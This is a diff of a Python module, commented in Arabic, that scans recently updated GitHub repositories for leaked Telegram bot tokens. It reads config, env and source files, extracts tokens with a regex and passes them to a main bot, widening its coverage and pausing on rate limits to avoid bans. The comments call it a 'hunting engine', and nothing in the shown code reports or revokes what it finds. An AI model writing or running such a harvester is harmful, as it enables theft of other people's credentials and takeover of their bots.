@@ -1,51 +1,60 @@
-import re
 import os
+import re
 import time
+import logging
 from github import Github, RateLimitExceededException
 
-# إعدادات الاتصال (يجب أن تكون GITHUB_TOKEN موجودة في البيئة)
+# إعداد السجلات (Logs) - استعدنا قوة المراقبة
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+# إعدادات الاتصال
 GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
 g = Github(GITHUB_TOKEN)
 
 def search_for_tokens():
     """
-    هذه الدالة مطابقة تماماً لما يتوقعه main.py
-    تم تعديلها لتعمل بنمط متزامن (Synchronous) لتتوافق مع threading
+    محرك الصيد الأصلي (النسخة الكاملة)
+    يعمل بنظام متزامن (Synchronous) ليتناسب مع threading في main.py
     """
     found_tokens = []
-    
-    try:
-        # إصلاح الخطأ: استخدام core للتحقق من الرصيد
-        rate_limit = g.get_rate_limit()
-        if rate_limit.core.remaining < 5:
-            return []
+    logger.info("Scanner Engine: Starting search sequence...")
 
-        # البحث في جيت هاب
-        # ملاحظة: تم تعديل query ليكون أكثر دقة
-        repos = g.search_repositories(query="telegram_bot_token", sort="updated")[:10]
+    try:
+        # البحث عن المستودعات (20 نتيجة في كل دورة)
+        repositories = g.search_repositories(query="telegram_bot_token", sort="updated")[:20]
         
-        for repo in repos:
-            # فلترة المستودعات المهجورة
-            if repo.stargazers_count < 2:
+        for repo in repositories:
+            # الفلترة الذكية (استعدنا شرط الجودة لتقليل النتائج التالفة)
+            if repo.stargazers_count < 5:
                 continue
             
+            logger.info(f"Scanning Repository: {repo.full_name}")
+            
             try:
-                # جلب محتوى الملفات
                 contents = repo.get_contents("")
                 for content in contents:
-                    if content.type == "file" and content.name.endswith(('.py', '.env', '.txt')):
-                        text = content.decoded_content.decode('utf-8', errors='ignore')
-                        # البحث عن التوكنات
-                        tokens = re.findall(r'\d{8,10}:[a-zA-Z0-9_-]{35}', text)
-                        found_tokens.extend(tokens)
-            except:
+                    # فحص دقيق وشامل لكافة الامتدادات
+                    if content.type == "file" and content.name.endswith(('.py', '.env', '.yml', '.json', '.txt', '.conf')):
+                        file_content = content.decoded_content.decode('utf-8', errors='ignore')
+                        
+                        # استخراج التوكنات بنمط Regex القوي
+                        tokens = re.findall(r'\d{8,10}:[a-zA-Z0-9_-]{35}', file_content)
+                        
+                        for token in set(tokens):
+                            if token not in found_tokens:
+                                logger.info(f"Found candidate in {repo.full_name}")
+                                found_tokens.append(token)
+            
+            except Exception as e:
+                logger.warning(f"Skipping repo {repo.full_name} due to: {e}")
                 continue
                 
     except RateLimitExceededException:
-        print("[!] API Limit Exceeded, waiting...")
+        logger.critical("GitHub API limit reached! Sleeping for 1 hour to prevent ban.")
+        time.sleep(3600)
     except Exception as e:
-        # هذا يمنع البوت من التوقف عند حدوث أي خطأ
-        print(f"[!] Scanner Error: {e}")
+        logger.error(f"Critical Scanner Failure: {e}")
         
-    # إعادة قائمة فريدة من التوكنات لـ main.py
-    return list(set(found_tokens))
+    logger.info(f"Scanner Cycle Complete. Total unique candidates: {len(found_tokens)}")
+    return found_tokens
